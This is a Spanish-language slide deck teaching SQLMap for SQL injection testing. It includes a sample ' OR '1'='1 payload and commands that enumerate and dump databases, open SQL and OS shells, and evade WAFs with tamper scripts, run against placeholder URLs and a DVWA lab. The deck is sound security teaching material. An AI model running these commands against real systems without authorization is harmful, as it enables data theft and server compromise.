---
theme: consult
---

<style>
	.reveal { font-size: 1.5em; }
	.reveal div { justify-content: flex-start  !important; }
	.reveal table { font-size: 0.2em; }
	.reveal h1 { font-size: 4em; color: #4169E1; }
	.reveal h2 { font-size: 3em; color: #2979FF; }
	.reveal h3 { font-size: 2em; color: #1E90FF; }
	.reveal p { font-size: 1.5em; color: black; text-align: left; }
	.reveal ul { align-self: flex-start;  text-align: justify; margin-left: 4.5em; margin-right: 2em }
	.reveal li { text-align: left; }
	.footnotes li { font-size: 1em;  color: grey;}
	.footnotes p { font-size: 1em;  color: grey;}
</style>

# SQLMap: Automatización de Inyecciones SQL

---

## 1. Introducción
### 1.1 ¿Qué es SQLMap?

* Herramienta de código abierto para automatizar la detección y explotación de vulnerabilidades de inyección SQL.
* Desarrollada en Python.
* Soporta una amplia gama de bases de datos.

### 1.2 Importancia de las inyecciones SQL
* Una de las vulnerabilidades web más comunes y peligrosas.
* Puede llevar a la pérdida de datos confidenciales, modificación de datos o incluso control total del servidor.


---

## 2. Funcionalidades Principales

* Detección de vulnerabilidades de inyección SQL.
* Explotación de vulnerabilidades para obtener información de la base de datos.
* Soporte para diferentes técnicas de inyección SQL (basadas en booleanos, basadas en errores, basadas en tiempo, etc.).
* Enumeración de bases de datos, tablas y columnas.
* Extracción de datos.
* Ejecución de comandos del sistema operativo.
* Soporte para diferentes tipos de bases de datos.

---

## 3. Conceptos básicos

### 3.1 Inyección SQL: Repaso rápido
- Técnica de ataque que explota vulnerabilidades en aplicaciones web.
- Permite ejecutar comandos SQL maliciosos en una base de datos.
- Ejemplo básico: 
```SQL
SELECT * FROM users WHERE id = '1' OR '1'='1';
```

### 3.2 ¿Cómo encaja SQLMap?
- Automatiza la detección de puntos de inyección.
- Extrae datos (usuarios, tablas, contraseñas) sin escribir consultas manualmente.
- Reduce el tiempo y esfuerzo en pruebas de seguridad.

---

## 4. Técnicas de Inyección SQL 

* **Inyecciones basadas en booleanos**: Se utilizan para determinar si una condición es verdadera o falsa.
* **Inyecciones basadas en errores**: Se aprovechan los mensajes de error de la base de datos para obtener información.
* **Inyecciones basadas en tiempo**: Se miden los tiempos de respuesta del servidor para inferir información.
* **Inyecciones UNION**: Se combina una consulta maliciosa con una consulta válida para extraer datos.
* **Inyecciones apiladas**: Se ejecutan múltiples consultas SQL separadas por punto y coma.
* **Out-of-band**: Se usa para cuando no hay manera de obtener los resultados por el mismo canal.

---

## 5. Instalación y requisitos

### 5.1 Requisitos previos
- Sistema operativo: Linux, Windows o macOS. [^1]
- Python instalado (versión compatible con SQLMap).
- Descarga desde el repositorio oficial: 
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
```

### 5.2 Instalación básica
- Clonar el repositorio o descargar el archivo ZIP.
- Navegar al directorio: `cd sqlmap`.
- Ejecutar: `python sqlmap.py -h` para verificar.
[^1]: En kali linux ya viene instalado.

---

## 6. Uso básico de SQLMap

### 6.1 Sintaxis general
- Comando base: `python sqlmap.py -u "URL" [opciones]`.
- Ejemplo: `python sqlmap.py -u "http://example.com/page?id=1"`.

### 6.2 Opciones comunes
- `-hh`: Para obtener todas las opciones posibles.
- `-u`: Especifica la URL objetivo.
- `--dbs`: Enumera las bases de datos disponibles.
- `--tables`: Lista las tablas de una base de datos.
- `--dump`: Extrae los datos de una tabla.
- `--schema`: permite obtener información sobre la estructura de la base de datos, como bases de datos, tablas, columnas.


---


### 6.3 Ejemplos prácticos:

```bash
# Lista de bases de datos detectadas (ej. `information_schema`, `usuarios`)
python sqlmap.py -u "http://example.com/page?id=1" --dbs

# Enumerar tablas
sqlmap -u "http://ejemplo.com/pagina.php?id=1" -D <nombre_bd> --tables

# Enumerar columnas
sqlmap -u "http://ejemplo.com/pagina.php?id=1" -D <nombre_bd> -T <nombre_tabla> --columns

# Extraer datos
sqlmap -u "http://ejemplo.com/pagina.php?id=1" -D <nombre_bd> -T <nombre_tabla> -C <columna1,columna2> --dump
```

---

## 7. Funcionalidades avanzadas

### 7.1 Detección automática
- `--level`: Nivel de profundidad en las pruebas (1-5).
- `--risk`: Nivel de riesgo en las pruebas (1-3).

---

### 7.2 Extracción de datos
- `--dump-all`: Descarga toda la base de datos.
- `--sql-shell`: Abre una shell SQL interactiva.
- `--os-shell`: Obtener una shell del sistema operativo.
- `-r`: Cargar una petición HTTP desde un archivo. 
- `--data`: Enviar datos POST. 
- `--cookie`: Especificar cookies.
- `--proxy`: Utilizar un proxy.
- `--batch`: Modo automático.
- `-p`: indica el parámetro que es vulnerable
-  `--technique`: indica la técnica a emplear, por ejemplo, inyecciones basadas en booleanos (B) o usar UNION (U).

---

### 7.3 Ejemplos complejos
- Las siguientes peticiciones usamos sqlmap con una request capturada. La request se puede obtener con burp suite u OWASP Zap, haciendo clic derecho y descargando la request.
- Uno de los problemas que nos podemos encontrar con SQLMap es que tengamos que ignorar ciertos códigos de error, como el 401.
- A veces sucede que corta la salida de texto cuando son muchos datos a devolver. Para evitarlo se usa `--no-cast` y `--no-escape`.
- La opción `--flush` se utiliza para forzar la salida inmediata de los resultados de cada consulta SQL ejecutada por la herramienta.

```bash
sqlmap -r req.txt --ignore-code=401 --dbms=sqlite --level=5 --risk=3 --technique=B -T <table> --columns

sqlmap -u http://URL?q= --dbms=sqlite --level 5 --risk 3 --schema --no-cast --no-escape

sqlmap -u 'http://URL?q=test' -p 'q' --dbms="sqlite" --technique U --prefix "')) " --level 5 --risk 3 --dump-all --no-cast --no-escape --flush
```

---

### 7.4 Evasión de seguridad
- `--tamper`: Usa scripts para evadir WAFs o filtros.
```bash
# Ejemplo
python sqlmap.py -u "URL" --tamper=space2comment
```

---

## 8. Demostración en vivo

### 8.1 Escenario
- Configurar un entorno vulnerable con DVWA [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
- Ejecutar:
```bash
sqlmap.py -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --dbs
```
- Mostrar resultados en pantalla.


---

## 9. Mejores prácticas y ética

### 9.1 Uso responsable
- SQLMap, al igual que el resto de herramientas de hacking ético, solo se debe usar en entornos de prueba o con permiso explícito.

### 9.2 Limitaciones de SQLMap
- No reemplaza el análisis manual.
- Puede generar falsos positivos o negativos.
- Depende de la configuración del objetivo.

---

## 10. Conclusión

### 10.1 Resumen
- SQLMap es una herramienta poderosa para pruebas de inyección SQL.
- Fácil de usar, pero requiere conocimientos básicos de SQL y seguridad.
- Ideal para aprender y practicar pentesting ético.

### 10.2 Documentación
- Documentación oficial de SQLMap: [http://sqlmap.org/](http://sqlmap.org/)